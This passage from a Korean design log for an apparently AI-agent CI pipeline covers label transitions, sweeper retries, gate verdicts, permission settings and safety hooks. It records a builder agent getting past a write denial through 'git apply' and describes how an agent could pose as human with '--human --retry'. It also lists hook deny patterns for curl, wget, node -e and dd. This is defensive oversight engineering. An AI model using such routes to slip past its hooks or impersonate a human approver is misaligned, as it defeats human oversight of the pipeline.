팔이다. 그 팔은 **R 예산을 하나 쓴다** — 즉 O20의 "취소는 R을 쓰지 않는다"가 이 드문 경로에서는
조용히 성립하지 않는다. 기록 줄("this run cannot prove it owned the stage")도 정상 종료 뒤 잡이
실패한 흔한 경우에는 이상 신호처럼 읽힌다. 둘 다 코드가 아니라 **한계로 적어 둔다**: 고치려면
"우리가 락을 잡았었다"는 사실을 프로세스 밖에 남겨야 하는데, 그 기록 자체가 또 하나의 실패 지점이다.
그리고 **(r2 리뷰가 남긴 한계)**: 락 소유자 판정의 `unknown` 상태에는 `stale`과 달리 재시도 유예가 없다(30분 재공지 dedupe뿐) — 하트비트와 `gh run view`는 같은 GitHub API·토큰을 쓰므로, 넓은 장애 창에서는 멀쩡한 런의 두 신호가 함께 침묵해 임계 뒤 `needs-human`으로 올라갈 수 있다. 조용히 얼어붙는 것보다 시끄러운 쪽을 택한 판결(MF1)의 대가이며, 그 창이 지나면 사람이 재큐한다.

**영향**: `factory/lib/gh.js`(`labelMutation`·`LABEL_RETRY_DELAYS_MS`·add-first `setFactoryLabel`/
`setTierLabel`·verify), `factory/lib/transition.js`(`cause` 인자·`label verify` 줄),
`factory/lib/retro/issue-comments.js`(`BLOCKED_CAUSES`·`blockedCause`·마커의 `cause=`),
`factory/lib/sweeper.js`(`sweepMissingStateLabel`·라벨-셋 복구의 `to`·`BLOCKED_ESCALATION_REASON`·
`CANCELLED_MAX_RETRIES`), `factory/bin/run-stage.js`(`ABORT_CAUSE`), `factory/lib/status.js`·
`factory/cli/status.js`(`no-state-label`), 스펙 §3.2·§4.3. 테스트: `gh.test.js` 7건,
`transition.test.js` 3건, `issue-comments.test.js` 3건, `sweeper.test.js` 8건, `status.test.js` 2건,
`run-stage.test.js` 1건.

**r1 (c361c7d 재리뷰 VERIFY)**: (d)·(e)의 복구가 **최신 전이 코멘트의 `to`**를 기록으로 쓰므로, `transition()`은 그 코멘트를 **라벨 스왑보다 먼저** 남긴다 — 스왑이 중간에 끊긴 바로 그 순간(라벨 2개)에 코멘트가 아직 없으면 최신 전이는 **이전** 전이이고, 복구가 그 옛 `to`로 이슈를 정리하며 방금 성공한 전이를 조용히 되돌린다. `label verify: repaired`는 스왑 뒤에 알 수 있는 사실이라 전이 마커를 들지 않은 별도 코멘트로 분리했다(`lastTransition`을 흔들지 않는다).

**r2 (19782b7 재리뷰 SF3·SF4·SF5·SF6)**: 같은 원칙을 남은 네 자리에 마저 적용했다. ① **요구사항 미달 거부**도 코멘트가 스왑보다 먼저 나가고 `factory-transition:v1 … to=factory:needs-human by=script reason=refused` 마커를 단다 — 그 순서가 아니면 반만 성공한 스왑을 라벨-셋 복구 팔이 **옛 라벨로 되돌리며** 방금 세운 에스컬레이션을 조용히 지운다(리뷰 finding 3: 리뷰 라운드 ~$10 × 2). ② `abortStage`의 전이를 `try/catch`로 감쌌다 — KTB-30 이후 `transition()`은 던질 수 있는 호출이고, `main()`은 이 함수를 맨몸으로 부르므로 그 예외 하나가 **락 해제와 run 기록을 통째로** 건너뛰었다(하필 API 장애 창에서만). ③ sweeper 잡의 `timeout-minutes`를 5 → 15로 올리고 **두 복구 팔을 맨 앞으로** 옮겼다(cron·`--quick` 둘 다) — 스왑당 최대 ~39초를 자는 재시도와 여덟 팔의 라벨 뮤테이션을 합치면, 넓은 API 장애(= 이 팔이 가장 할 일이 많은 상황)에서 복구 팔에 닿기 전에 잡이 SIGKILL될 수 있었다. ④ `factory status`의 `[no-state-label]`이 8번 팔과 **같은 집합**을 본다: `factory:*` 라벨이 남아 있는 이슈뿐 아니라, 라벨이 하나도 없어도 전이 이력이 있는 이슈까지(24시간 창 — 상태 라벨이 그 이슈의 유일한 factory 라벨이었던 경우, 곧 triage 이전의 #2 모양). 그 밖에 `claim refused` 상태 문구도 `truncateReason`을 지난다 — 공개 이슈 코멘트가 run 기록보다 더 공개적인 자리다.

#### KTB-31 — `factory:rework`을 보는 팔이 없었다: 좀비 런 하나가 이슈를 65분 세웠다

**질문**: 2026-09-13 08:58Z, #15이 review에서 `factory:rework`으로 내려갔다. 그 라벨 이벤트가 만든
implement 런 34748735031은 GitHub에서 **잡 없이 `queued`인 채로** 굳었다 — 08:50~08:55Z의 Actions
장애 창(O23) 직후였고, 러너가 배정되지 않았다. 그 뒤 아무 일도 일어나지 않았다: 하트비트가 없으니
1번 팔(in-progress 재큐)에 안 걸리고, blocked 라벨이 없으니 2번 팔에도 안 걸리고, 재점화 표
(`STALLED_STAGE`)에 `factory:rework`이 **없어서** 5번 팔도 보지 못했다. 10:02Z에 관측자가 손으로
`workflow_dispatch`를 칠 때까지 65분. 스펙 §3.2에는 `rework --> in_progress` 엣지가 있는데, 그 엣지를
다시 밟게 하는 장치만 없었다.

**결정**: 둘이다.

(a) **`factory:rework → implement`을 재점화 표에 넣는다**(cron·`--quick` 둘 다). 다른 대기 라벨과
계약이 같다: 마지막 재큐 이후 2회까지, 흐름 제어(`backPressure`)가 세워 둔 것은 멈춘 것이 아니며,
밀기 직전에 락을 본다(MF1의 세 값). 이 표에 `rework`이 없던 이유는 설계가 아니라 누락이다 —
`BLOCKED_RETRY_STAGE`에는 `in-progress`까지 있었다.

(b) **스테이지가 시작조차 못 했으면 임계는 10분이다**(`STALL_NO_HEARTBEAT_MIN`). 30분은 "도는
스테이지가 하트비트를 놓쳤다"의 여유인데, 이번 스테이지의 하트비트가 **하나도** 없으면 기다리는
대상이 다르다: 런이 아예 뜨지 않았거나 뜨자마자 죽은 것이고, 그 사실은 10분이면 확정된다(워크플로
큐 + checkout + claim + 첫 하트비트까지 실측 1~3분). 하트비트는 **마지막 전이 뒤**의 것만 센다 —
지난 스테이지의 하트비트가 "이번 스테이지는 시작했다"를 뜻하지는 않는다.

**영향**: `factory/lib/sweeper.js`(`STALLED_STAGE`·`STALL_NO_HEARTBEAT_MIN`·하트비트 창),
스펙 §4.3-5. 테스트: `sweeper.test.js` 3건(rework 재점화 cron+quick, 하트비트 없음 → 10분,
하트비트 있음 → 30분 그대로).

#### KTB-32 — `needs-human`에서 나가는 길이 `queue`뿐이라, 완성된 PR도 plan부터 다시 돈다 (설계 공백 — **1.1에서 구현됨**)

라운드 10(2026-09-13 10:22~10:38Z)에서 러너의 구독 토큰이 세션 한도(429)에 걸려 #2·#15·#18의 스테이지가
한꺼번에 죽었다. KTB-22의 경로대로 `blocked`이 됐지만 R 예산은 앞선 인프라 장애로 이미 소진돼 있어
곧장 `needs-human`으로 올라갔다 — 여기까지는 판결대로다. 문제는 그다음이다: #2는 **implement가 끝나
PR #17(+1239/−11, 실제 pg 통합 테스트)이 온전한 채** review에서 죽었는데, `factory:needs-human`의
유일한 출구가 `→ factory:queue`(§3.2)라 사람이 할 수 있는 결정은 "plan부터 다시"뿐이었다. 그 재실행은
이슈당 plan+implement ≈ $40이고, 잃은 것은 코드가 아니라 라벨 한 칸이었다.

**판결**: `unstick` 스킬에 `retry` 결정을 추가하고,
`factory:needs-human → <중단 지점>` 엣지를 **사람 전용**(`by=human`)으로 연다. 원점이 `awaiting-review`면
review부터, `planned`/`rework`면 implement부터 이어 간다. 손 라벨 차단(§12.4)은 그대로다 — 이 엣지도
`transition.js`를 지나며, 전이 코멘트와 중단 지점이 근거가 된다.

**보강 — 구현(1.1, 2026-09-14)**: 이월로 남겼던 이 판결을 그대로 구현했다. 계기는 같은 결함이 KTB 자기
자신의 #3에서 다시 났다는 것이다(implement는 끝났고 review가 인프라로 죽었다 — plan부터 다시 돌릴 이유가
없다). 판결과 **한 곳만** 다르다: 중단 지점의 출처를 `factory-blocked-origin` 마커가 아니라 **전이 코멘트**로
잡았다. 그 마커는 `→ blocked` 전이에만 붙는데, 요구사항 미달 거부처럼 `blocked`을 거치지 않고 곧장
`needs-human`으로 간 경로에는 마커가 없어서 그 이슈들이 통째로 재시도 밖에 남기 때문이다. 대신 규칙은
같은 사실을 더 넓게 읽는다: **마지막으로 `→ factory:blocked` 또는 `→ factory:needs-human`으로 간 전이의
`from=`**, 단 그 `from` 자신이 정지 상태인 전이는 건너뛴다(`blocked → needs-human`은 sweeper의
에스컬레이션이지 "일이 멈춘 자리"가 아니다 — 라이브 #3이 정확히 이 모양이다).

- **엣지**(`factory/lib/labels.js`): `HUMAN_RETRY_TARGETS = {ready, planned, rework, awaiting-review}`는
  `TRANSITIONS`에 **넣지 않았다** — 그래프에 넣으면 스크립트도 밟을 수 있고, 그러면 어느 스테이지든
  판정을 건너뛰고 원하는 자리로 이슈를 옮길 수 있다. `canTransition(from, to, {human:true})`에서만 열린다.
  `queue`는 이 목록에 없다(그래프의 정규 출구 그대로다).
- **두 번째 자물쇠**(`factory/lib/transition.js`): 사람이라고 아무 데나 가지 않는다. 목적 라벨이
  `resumePoint(comments)`와 정확히 같아야 하고, 다르면 전이 없이 exit 2다(사유가 올바른 목적지를 말한다).
  `in-progress`에서 멈춘 이슈는 **이번 주기**(마지막 재큐 이후)에 implement handoff가 있으면 `rework`로,
  없으면 `planned`로 간다. `transition.js <n> --human --retry`는 목적 라벨을 생략하는 축약이고, 라벨을
  명시한 사람 전이도 같은 검사를 지난다.
- **요구조건**(`factory/lib/requirements.js`): 재시도는 `prerequisite`와 **같은 것만** 면제한다(이번 런의
  게이트 파일·sha 바인딩 — 사람의 노트북에 있을 수 없고, 그 판정은 되돌아간 스테이지가 다시 만든다).
  handoff의 존재·유효성·내용(verifier 판정 등)은 그대로 물린다: `awaiting-review`로 착지하려면 유효한
  implement handoff(= PR 번호 포함)가 있어야 한다.
- **라운드 카운터**: 재시도 전이는 마커에 `reason=retry`를 달고, `countTransitionsTo`가 그 전이를 세지
  않는다. 재시도는 재큐가 아니므로 라운드 창(`commentsSinceRequeue`)을 열지도 않는다 — `rework`로
  되돌아가는 재시도가 K 예산을 한 칸 태우면 이 엣지의 값어치가 그만큼 준다.

**보강 — MF-2 잠금(리뷰 3c63672, 2026-09-14)**: 위 구현이 `human:true`를 그래프의 자물쇠로 놓았지만,
그 값 자체는 **누가** 세우는지 아무 데도 강제하지 않았다 — `.claude/settings.json`의 `Bash(*)` 허용과
`factory/hooks/block-dangerous.sh`에 이 CLI를 가리키는 규칙이 없어, 에이전트가 `node .factory/bin/transition.js
<n> --human --retry`를 직접 실행해 스스로를 "사람"이라 자칭할 수 있었다(스크립트가 그래프 엣지를 열 수
없다던 §3.2의 문장을 이 CLI 경계에서 반증한다). 두 자물쇠로 닫는다: (1) `hooks/block-dangerous.sh`가
PreToolUse 경계에서 `transition.js … --human`/`--retry` 셸 호출 자체를 차단한다(기존 `$A`/`$Z` 경계
클래스를 그대로 써서 래퍼·`$( )`·체인·백슬래시 형태까지 잡는다 — MF-3/재리뷰 #1·#4와 같은 방식). (2)
`factory/lib/transition.js`의 새 순수 함수 `refuseHumanFlag(env)`가 `CLAUDE_PROJECT_DIR`나
`GITHUB_ACTIONS`가 서 있으면 true를 돌려주고, `bin/transition.js`는 그 값이 true면 `gh`를 부르기도
전에 `--human`/`--retry`를 exit 2로 거절한다. (3, 리뷰 aab3db8) 같은 판정이 `transition()` 함수 첫 줄에도
있다 — `node -e "import('lib/transition.js')…"`처럼 CLI를 건너뛰는 호출은 훅의 `--human` 토큰도 래퍼의
검사도 지나치므로, 문은 라이브러리 자신이 잠근다 — `run-stage.js:84`가 모든 스테이지의 `claude -p` env에
`CLAUDE_PROJECT_DIR`를 심으므로(자식 프로세스가 그대로 물려받는다) 에이전트 세션과 CI 러너를 신뢰성
있게 가려낸다. 둘 다 없는 사람의 노트북 셸에서만 통과한다.

**보강 — `needs-info`까지 (KTB-36 라운드, 2026-09-14)**: 같은 낭비가 **다른 라벨**에서 그대로 남아
있었다. KTB-23의 하네스 대기 주차는 implement 한가운데서 이슈를 `in-progress → needs-info`로 세우고,
그 하네스 PR은 구성상 보호 경로를 건드리므로 **사람이** 머지한다(KTB-23/24 r1의 1번이 그 사실 때문에
해제 팔을 sweeper로 옮겼다). 그런데 `factory:needs-info`의 출구는 §3.2에서 `→ queue` 하나뿐이라,
사람이 하네스를 손으로 고치고 돌아오면 — 플랜이 한 글자도 바뀌지 않았는데 — plan부터 다시 돈다.
`needs-human`에서 고친 것과 같은 결함이고, 고치는 방법도 같다.

- **엣지**: `HUMAN_ONLY_TRANSITIONS`가 이제 `{needs-human, needs-info} → HUMAN_RETRY_TARGETS`다
  (목적지 넷은 그대로 — 전부 어느 스테이지의 정상 진입 라벨이다). 그래프(`TRANSITIONS`)는 한 줄도
  바뀌지 않았다: 스크립트가 밟을 수 있는 needs-info의 출구는 여전히 `→ queue` 하나다.
- **중단 지점**: `STOP_STATES`에 `factory:needs-info`를 더한다 — `resumePoint`는 `to=`가 정지 상태인
  마지막 전이의 `from=`을 읽으므로, 하네스 주차(`in-progress → needs-info`)가 자연히 중단 지점이
  된다(이번 주기에 implement handoff가 있으면 `rework`, 없으면 `planned` — `in-progress`의 기존 규칙
  그대로다). triage가 세운 `queue → needs-info`도 같은 규칙에 걸리지만 `from=queue`라 `target: null`이
  되어 재시도가 **거부된다** — 그 이슈는 실제로 보강 후 재큐(`:clarify`)가 맞고, 추측하지 않는다.
  `needs-info → queue`(sweeper의 해제)는 `to`가 정지 상태가 아니라 이 판정을 흔들지 않는다.
- **자물쇠 셋은 한 글자도 바뀌지 않았다**: 훅(`block-dangerous.sh`의 `transition.js … --human/--retry`
  차단)·CLI(`refuseHumanFlag`)·라이브러리(`transition()` 첫 줄)가 출발 라벨과 무관하게 같은 답을 한다.
- **sweeper는 그대로 `→ queue`다**(스크립트 경로). 그것이 이 엣지를 사람 전용으로 둔 이유다 — "플랜은
  건드리지 않았다"는 **판단**을 스위퍼가 대신할 수는 없다. 하네스 수정이 플랜을 건드리지 않고 착지한
  경우에만 사람이 `--retry`를 고르고, 그 판단은 `human-decision:v1` 코멘트로 남는다(`:unstick` 3f).

**영향**: `factory/lib/labels.js`, `factory/lib/transition.js`(+`bin/transition.js`의 `--retry`,
`refuseHumanFlag`), `factory/lib/requirements.js`, `factory/lib/retro/issue-comments.js`(`resumePoint`·
`lastHumanDecision`·`countTransitionsTo`), `factory/hooks/block-dangerous.sh`(MF-2 규칙),
`templates/know-thy-build/unstick.md`(결정 `retry`, 3f), 스펙 §3.2.
테스트: `labels.test.js`·`transition.test.js`(스크립트 거부, 잘못된 목적지 거부, 원점별 해석, 라운드 불변,
인자 파싱, `refuseHumanFlag`·bin의 env 거절)·`hooks.test.js`(`transition.js --human/--retry` 차단 +
`--human` 없는 스크립트 경로는 그대로 허용)·`requirements.test.js`·`skills-ops-b.test.js`.

#### KTB-35 — 테스트는 하나도 깨지지 않았는데 게이트가 RED다 (판정의 문장이 틀렸다)

KTB 자기 자신의 #3 implement R2(run 34809992796)에서 `unit` 게이트가 code 1로 RED였는데
`.factory/out/unit.json`은 **1715/1715 통과**였다. 그 런이 사람에게 남긴 문장은
`stage artifact missing or invalid: gates RED: failing=unit` — "테스트가 깨졌다"로 읽히는데 깨진 테스트는
없었다. 같은 저장소의 publish CI에서 앞서 관측된 것이 원인을 말해 준다: vitest가 **포크된 워커의
`console.error`**에서 `Error: write EPIPE`로 죽었다. 테스트는 전부 끝난 뒤였고, 죽은 것은 테스트 밖이다.

**판결**: 세 자리를 고친다.

1. **원인을 줄인다** — `vitest.config.js`에 `silent: true`. 워커가 테스트 본문의 콘솔 출력을 이미 닫힌
   파이프에 쓰지 않는다. 리포터 출력과 `--reporter=json --outputFile` 리포트 **파일**은 그대로다(게이트의
   판정 재료가 그 파일이므로 이것이 조건이었다).
2. **판정은 그대로 RED, 문장만 바꾼다** — `factory/lib/gates.js`: 테스트 게이트의 명령이 exit≠0인데
   **읽어낸 리포트의 실패가 0개**면 RED를 유지하되(fail closed — 무엇이 죽였는지 모르는 채 GREEN으로
   부르지 않는다) `reason: "command exited <code> with 0 failing tests — unhandled error outside tests
   (see gate log)"`를 달고, `log`에 그 명령의 **stderr 마지막 20줄**을 싣는다(`scrub-artifacts.js`의
   `scrubText`로 크리덴셜을 지운 뒤). 리포트를 못 읽은 RED는 이 경로가 **아니다** — 그 RED의 이유는
   "모른다"이지 "테스트 밖 오류"가 아니다.
3. **등급은 needs-human이 아니라 blocked** — `factory/bin/run-stage.js`가 그 `reason`을 그대로 전이 사유로
   싣고 `factory:blocked`(cause `gates-unhandled`)으로 세운다. 원인이 대개 일시적 인프라이므로 KTB-15b
   경로가 같은 스테이지를 **한 번** 다시 돌리고(sweeper 기본 예산 1회), 그래도 같으면 사람에게 올린다 —
   그때의 문장도 원인을 이름으로 말한다(`BLOCKED_ESCALATION_REASON["gates-unhandled"]`). `undecidable`로
   묶지 않은 이유: 그 등급은 "판정 재료를 못 구했다"인데 여기서는 재료(리포트)를 온전히 구했고, 어긋난
   것은 명령의 종료 코드다. 등급을 갈라 두어야 사람이 받는 문장과 재시도 계약이 각각 맞는다.

**영향**: `vitest.config.js`, `factory/lib/gates.js`, `factory/bin/run-stage.js`,
`factory/lib/retro/issue-comments.js`(`BLOCKED_CAUSES` + 원인 규칙 — `gates`보다 **먼저** 물려야 한다:
사유 문구에 "gate log"가 들어 있다), `factory/lib/sweeper.js`(에스컬레이션 문장). 테스트:
`gates.test.js`·`run-stage.test.js`·`sweeper.test.js`·`issue-comments.test.js`.

(이후 항목은 dogfood 진행에 따라 추가)
#### 최종 리뷰 (Plan 6) — MF-1 · MF-4: 아무 팔도 보지 않는 대기 상태 하나, 세 팔 중 하나만 남은 옛 계약

**리뷰 지적** (`spec/factory-1.0` @ 2ad4e32 전수 리뷰). 둘 다 **고침들 사이의 이음매**다 — 어떤 개별 고침의 회귀가 아니라, 고침이 만든 새 자리를 아무도 보지 않는다는 것.

- **MF-1**: `sweeper.js`의 `STALLED_STAGE`에 `factory:queue`가 없었다. KTB-31이 `factory:rework`에서 고친 것과 **같은** 결함이 라벨 하나에 더 남아 있었던 것이고, 하필 그 라벨이 **`sweepHarnessUnpark`의 목적지**다. 해제 마커의 dedupe는 평생이라, `needs-info → queue` 전이가 만든 `labeled` 이벤트의 다섯 런 중 `factory-triage`가 사라지면(도그푸딩에서 두 번 관측: 데모 #2의 동시성 물결, #15의 Actions 장애 중 좀비 `queued`) 그 피처는 **영원히** 큐에 앉는다 — 해제 팔은 마커를 보고 다시 시도하지 않고, 다른 어떤 팔도 그 라벨을 보지 않았다. KTB-23(하네스 주차)이 하려던 일 전체가 마지막 한 칸에서 끝난다. `needs-human → queue`(`:unstick`)와 blocked 팔의 `blocked → queue` 재시도도 같은 막다른 길이었다.
  **결정**: `"factory:queue": "triage"`를 `STALLED_STAGE`에 더한다(cron·`--quick` 둘 다). 임계는 다른 라벨과 같다 — 하트비트가 하나도 없으면 `STALL_NO_HEARTBEAT_MIN`(10분). 스펙 §4.3-5의 목록도 같이 고쳤다.
  **범위 밖(알려진 한계)**: `factory:harness` 이슈는 `factory:queue`로 **생성**되고 전이를 거치지 않으므로 전이 코멘트가 아예 없고, `sweepStalled`는 전이 코멘트 없이는 나이를 판정하지 않는다(추측해서 미는 것보다 낫다는 기존 판결). 그 이슈의 첫 triage 런이 유실되는 경우는 여전히 사람의 `factory status`가 잡는다 — 나이의 대체 출처(이슈 `createdAt`)를 여기서 도입하지 않은 이유는, 그것이 "전이 코멘트가 있어야 판정한다"는 이 팔의 단일 전제를 라벨마다 갈라 놓기 때문이다.
- **MF-4**: r2 MF1이 락 판정을 `live`/`none|stale`/`unknown` 세 값으로 갈랐는데, **세 팔 중 하트비트 재큐 팔만** r1의 불리언 계약에 남아 있었다: `unknown`을 "락은 그냥 둔다"로만 읽고 **재큐는 그대로 진행**했다. 로컬 `factory run implement <n>`(§4.2.5의 지원되는 진입 경로)은 `runner=local/<host>`라 판정이 **영구히** `unknown`이고, 하트비트 패치 실패는 설계상 삼켜지므로 GitHub 딸꾹질 한 번이면 살아 있는 런이 30분 창을 넘긴다. 그러면 다음 quick sweep(KTB-26 이후 **모든 스테이지 끝**에 돈다 — 잦다)이 `in-progress → planned`로 재큐해 R 예산을 태우고, 살아 있던 builder가 GREEN PR을 밀고 `in-progress → awaiting-review`를 부르면 현재 라벨이 이미 `planned`라 그래프가 거부한다 — **끝난 구현이 좌초하고** 다음 dispatch가 처음부터 다시 돈다. GHA 러너도 `gh run view`가 실패하면(토큰 스코프, Actions 장애) 같은 문에 들어선다: 이 팔이 살아남으라고 있는 바로 그 상황이다.
  **결정**: 두 dispatch 팔과 **같은 판정**을 한다 — `unknown`이면 재큐하지 않고, 스톨 임계를 넘겼으면 `lock-owner-unknown` 마커 + `factory:needs-human`(`escalateUnknownLock`). 임계 안이면 조용히 넘어간다(`requeue-skipped`) — 정상적으로 시작하는 스테이지를 그 자리에서 사람에게 넘기지 않기 위해서다(blocked 팔의 같은 판정과 짝이다).

**함께 (nit 1)**: `BLOCKED_RETRY.implement.origins`와 `BLOCKED_RETRY_STAGE`의 `factory:planned`는 **도달할 수 없는 항목**이었다 — 그래프에 `planned → blocked` 엣지가 없고, `abortStage`는 라벨이 그 스테이지의 in-flight 라벨(`in-progress`)일 때만 민다. 지웠다. 표는 실제로 생길 수 있는 것만 적어야 표다(`labels.test.js`가 이제 모든 origin에 대해 `canTransition(from, "factory:blocked")`를 요구한다).

**영향**: `factory/lib/sweeper.js`(`STALLED_STAGE`·heartbeat 팔·`BLOCKED_RETRY_STAGE`), `factory/lib/labels.js`, `factory/test/sweeper.test.js`·`labels.test.js`·`run-stage.test.js`, 스펙 §4.3-1·§4.3-5.

### ⑤ 권한·훅 — KTB-13·14·20·21·23·36·39·40·43

`--permission-mode dontAsk`의 실제 동작이 스파이크 시점(ADR-002/ADR-008)과 달라져 있었다는 발견(KTB-13, 재리뷰 r1·r2)과, 그로 인해 넓어진 allow가 열어 준 "쓰기 금지 역할이 훅 모르게 워크트리를 건드릴 수 있다"는 잔여 위험을 구조적으로 닫은 결정(KTB-14)을 묶는다.

#### KTB-13 — `dontAsk`는 allow에 없는 도구를 **거절**한다: allow 목록이 부여이고, deny·훅이 가드다

**질문**: CI는 `claude -p /factory-<stage> <n> --permission-mode dontAsk --settings .factory/ci-settings.json`으로 스테이지를 돌린다. 설치된 `.claude/settings.json`의 `permissions.allow`는 Bash 패턴 8개뿐이었다(`Bash(git *)`, `Bash(gh issue *)`, `Bash(gh pr view*|comment*|create*|edit*)`, `Bash(npm *)`, `Bash(npx *)`) — `Read`·`Edit`·`Write` 같은 **도구 이름은 한 줄도 없다**. 설계는 그것으로 충분하다고 적었다: ADR-002·ADR-008의 스파이크에서 `--permission-mode dontAsk`가 "모든 툴 호출을 프롬프트 없이 통과"시켰고 `permission_denials: []`였기 때문이다. 그 전제가 아직 참인가.

**관측** (데모 라이브):

- **거짓이다.** 지금 CLI의 `dontAsk`는 allow 규칙에 걸리지 않는 도구 호출을 **묻지 않고 거절한다** — "doesn't ask"가 "approves"가 아니라 "denies without asking"이다.
- 데모 이슈 #2의 implement 라운드에서 builder가 보고했다: "Write and Edit tools are denied by the sandbox (dontAsk mode), and bash file writing (redirection, heredoc into a file) is denied too. Creating files through git apply is accepted only for trivial…" — 그리고 포기하고 `factory:needs-human`으로 넘어갔다. **스테이지가 코드를 한 줄도 쓰지 못한 채 끝났다.**
- 이슈 #8은 성공했는데, 그 방식이 증상을 그대로 설명한다 — builder가 편집을 `git apply`에 실어 날랐다(`Bash(git *)`가 allow에 있었으므로). 좁은 allow 목록이 곧 **차단 목록**이었고, 에이전트는 그 목록의 구멍을 찾아 우회하는 법을 배우고 있었다.
- ADR-002/ADR-008의 관측 자체는 그 시점에는 정직했다(그래서 지우지 않는다). 스파이크 시점 CLI의 동작이고, 그 뒤에 바뀌었다. 아래가 **현행 CLI 버전에 대한 철회**다.

**결정**: **allow 목록은 편의 목록이 아니라 에이전트가 가진 도구의 정의다.** `templates/factory/claude/settings.json`의 `permissions.allow`에 팩토리 에이전트가 실제로 쓰는 도구를 싣는다 — `Read`, `Edit`, `Write`, `MultiEdit`, `NotebookEdit`, `Glob`, `Grep`, `LS`, `Agent`, `Workflow`, `TodoWrite`, 그리고 `Bash(*)`. 좁은 Bash 항목 8개는 **대체한다**: `dontAsk`에서 allow에 없는 Bash 명령은 그대로 거절이므로, 그 목록은 `mkdir`·`cat > file`·`sed -i` 같은 builder의 정당한 명령을 막고 있었다.

**무엇이 여전히 가드인가** — 넓어진 것은 부여이지 방벽이 아니다. 네 겹은 그대로다:

- **deny는 allow를 이긴다**(두 파일 모두 그대로다). `.claude/settings.json`의 `gh pr merge*`·`git merge*`·force-push·branch-protection PUT, `.factory/ci-settings.json`의 경로 `Edit`/`Write` deny 전부(`.factory/**`·`.claude/**`·CHARTER·빌드 설정)와 CI 전용 deny. `Bash(*)`가 allow에 있어도 `Bash(git push --force*)`는 여전히 거절된다.
- **`block-dangerous.sh`(PreToolUse)** 가 위험한 셸 모양과 보호 경로 쓰기를 계속 거부한다. 이것이 `Bash(*)`의 실질적 경계다.
- **`deny-all-writes.sh`(역할 frontmatter의 PreToolUse)** 가 쓰기 금지 역할(triage·plan-\*·reviewer-\*·verifier·loader)의 `Edit`/`Write`/`NotebookEdit`과 "파일을 만드는 bash"를 막는다. **순서가 이것을 성립시킨다: PreToolUse 훅은 permission 판정보다 먼저 돌고, exit 2는 도구 호출 자체를 차단한다** — 그 도구가 allow에 있는지와 무관하다. 그래서 전역 allow가 넓어져도 리뷰어는 여전히 쓸 수 없다(`hooks.test.js`가 이것을 고정한다).
- **L0 `factory/integrity` + L1 merge 스테이지**(KTB-5·KTB-6)가 변조와 보호 경로 변경을 PR 단계에서 잡는다.

**doctor**: `checkSettings`에 `settings.allow`를 더한다 — 템플릿 allow 항목이 하나라도 빠지면 **FAIL**이다(`settings.deny`와 같은 모양·같은 무게). 빠진 설치본은 "조금 불편한" 설치본이 아니라 **builder가 파일을 쓰지 못하는** 설치본이다. 상위집합(사람이 자기 항목을 더한 브라운필드)은 PASS다.

**기존 설치**: `mergeSettings`가 deny·allow를 **합집합**으로 병합하므로 `factory init --upgrade`가 새 항목을 더한다(멱등 — KTB 자신에게 적용해 확인). 뒤에 남는 좁은 Bash 항목은 무해하다: `Bash(*)`가 그것을 포함하고, allow는 서로를 취소하지 않는다. `MOVED_DENIES_ADR_019` 같은 제거 목록은 만들지 않는다 — 지울 이유가 없다.

**영향**: §6.3(allow 문단), `templates/factory/claude/settings.json`, `factory/lib/doctor/factory.js`, `factory/test/templates.test.js`·`doctor-factory.test.js`·`hooks.test.js`.

##### KTB-13 fix round 1 — 훅이 실제로 무엇을 덮는가 (잔여 위험 등록부)

**리뷰 지적**: allow를 부여로 바꾼 판결 자체는 옳지만, 그 근거였던 "`block-dangerous.sh`가 `Bash(*)`의 실질 경계이고 `deny-all-writes.sh`가 읽기 전용 역할을 막는다"는 문장이 **검증되지 않은 채** 쓰였다. 좁은 allow가 실제로는 두 번째 방벽이었다 — `node`·`curl`·`wget`·`install`은 애초에 allow에 없어서 훅까지 **도달하지도 않았고**, 그래서 두 훅 어느 쪽도 그 모양들을 본 적이 없다. allow를 열면서 그 모양들이 처음으로 훅 앞에 선다.

**수정** (두 훅 + 매처):

- `deny-all-writes.sh`(쓰기 금지 역할): `MultiEdit`을 `Edit|Write`와 같은 팔에 넣고, Bash arm에 `node -e|-p|--eval|--print`(인라인 스크립트는 대상 불문 차단 — `sed -i`·`python -c`와 같은 원칙), `curl`의 출력 플래그(`-o`·`-O`·`--output`·`--output-dir`·`--remote-name`), `wget` **전면**(플래그가 없어도 URL의 마지막 세그먼트로 cwd에 파일을 만든다), `install`(파일 변형 명령 목록에 추가), `cp`/`mv`의 `-t`/`--target-directory`(목적지를 마지막 토큰이 아닌 곳에 두어 "목적지만 보는" 규칙을 통째로 빠져나갔다)를 더했다. 저장소 스크립트 실행(`node .factory/bin/prove-test.js`)과 출력 플래그 없는 `curl`은 그대로 통과한다.
- `block-dangerous.sh`(builder, 보호 경로만): `node` 인라인 스크립트가 보호 경로를 말하는 경우, `dd of=<보호경로>`, `install … <보호경로>`, `curl`/`wget` 세그먼트에 보호 경로가 보이는 경우, `git checkout <ref> -- <보호경로>`·`git restore <보호경로>`(다른 커밋의 내용으로 워킹 트리를 덮는다), 그리고 `git apply`/`git am` **전면 차단**을 더했다. `git apply`만 전면인 이유: 패치 내용이 명령줄에 없어 훅이 **무엇이 쓰이는지 볼 수 없다** — 판정 불능은 안전이 아니다(이 파일 맨 위 jq 규칙과 같은 원칙). builder에게 손실은 없다(KTB-13 이후 `Edit`/`Write`로 직접 쓴다). 데모 #8이 쓴 우회로가 바로 이것이고, 여기서 닫힌다.
- 매처: 쓰기 금지 역할 14개의 `hooks.PreToolUse.matcher`가 `Edit|Write|MultiEdit|NotebookEdit|Bash`다. `lintAgentMd`의 `deny-hook` 규칙이 이제 **다섯 이름 전부**를 요구하고 무엇이 빠졌는지 말한다(`DENY_WRITES_TOOLS`가 정본 — 훅 스크립트가 판정해도 매처가 좁으면 그 판정은 발화하지 않는다).

**잔여 위험 등록부.** 아래가 지금 실제로 막히는 것과 막히지 않는 것이다 — "훅이 덮는다"를 다시 검증 없이 쓰지 않기 위해 표로 고정한다.

> **읽는 법 (최종 리뷰 MF-3 + 0452b5b 재리뷰 이후)**: 이 표의 "차단"이 **정확히 어디까지**인지 먼저
> 못 박는다 — 여기에 "어느 자리에 있든"이라고 적었던 앞 판본은 코드보다 강한 주장이었고, 그것이 바로
> MF-3이 제기된 고장(등록부가 코드에 없는 커버리지를 주장하는 것)의 재발이었다. 지금 덮는 자리는
> 이것이 **전부**다:
>
> 1. **토큰 경계**: 줄 시작 · 공백 · `(` · 백틱 · `;` · `&` · `|` · `=` · `{` 뒤. 뒤쪽 경계도 같은
